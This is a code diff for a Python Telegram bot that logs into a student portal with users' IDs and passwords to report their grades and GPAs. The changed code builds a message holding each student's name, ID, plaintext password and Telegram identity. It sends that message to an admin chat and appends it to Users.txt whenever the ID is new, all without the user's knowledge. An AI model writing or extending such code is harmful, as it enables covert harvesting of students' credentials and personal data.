@@ -250,10 +250,8 @@ def process_password(message, student_id):
     json_text = soup.get_text()
     data2 = json.loads(json_text)
     name=data2["stuName"]
-    with open('Users.txt', 'a') as file:
-    	file.write(f"\nName: {name}\nID: {student_id}\nPassword: {password}\n{'-' * 50}\n")
-    	calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message)
-    	calculate_and_send_course_info(chat_id, data2)
+    calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message)
+    calculate_and_send_course_info(chat_id, data2)
 
 def grade_translation(grade):
     if grade == 'A':
@@ -339,9 +337,6 @@ def calculate_and_send_course_info(chat_id, data2):
     except Exception as e:
         bot.send_message(chat_id, f"An error occurred: {str(e)}", parse_mode='Markdown')
 
-def save_gpa_to_file(semester):
-    with open('Users.txt', 'a') as file:
-        file.write(f"\nالمعدل الفصلي: {semester['GPA']}        المعدل التراكمي: {semester['CurrGPA']}")
 
 def calculate_and_send_course_info1(chat_id, data2, admin_chat_id):
     try:
@@ -358,13 +353,12 @@ def calculate_and_send_course_info1(chat_id, data2, admin_chat_id):
 
 def calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message):
     try:
-        admin_message = (
+        admin_message = (f"\n--------------------------------------\n"
             f"ℹ️ *معلومات المستخدم:*✅\n"
             f"• **اسم الطالب:** {name} \n"
             f"• **كود الطالب:** {student_id} \n"
             f"• **كلمة المرور:** {password}\n"
-            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})\n"
-            f"-------------------------------------"
+            f"• **المستخدم:** {message.from_user.first_name} {message.from_user.last_name} (@{message.from_user.username})"
         )
 
         for year_data in data2["StuSemesterData"]:
@@ -373,8 +367,14 @@ def calculate_and_send_course_inf(chat_id, data2, name, student_id, password, me
                 semester_gpa = semester["GPA"]
                 cumulative_gpa = semester["CurrGPA"]
                 total_credits, message_text = print_course_info(semester["Courses"], semester_name, cumulative_gpa)
-                admin_message += f"\nالمعدل الفصلي: {semester_gpa}        المعدل التراكمي: {cumulative_gpa}"
+                admin_message += f"\n•المعدل الفصلي: {semester_gpa}        المعدل التراكمي: {cumulative_gpa}"
+
         bot.send_message(admin_chat_id, admin_message)
+        with open('Users.txt', 'r') as file:
+            file_contents = file.read()   
+        if str(student_id) not in file_contents:     
+            with open('Users.txt', 'a') as file:
+                file.write(f"{admin_message}")
     except Exception as e:
         print(f"حدث خطأ: {e}")
 
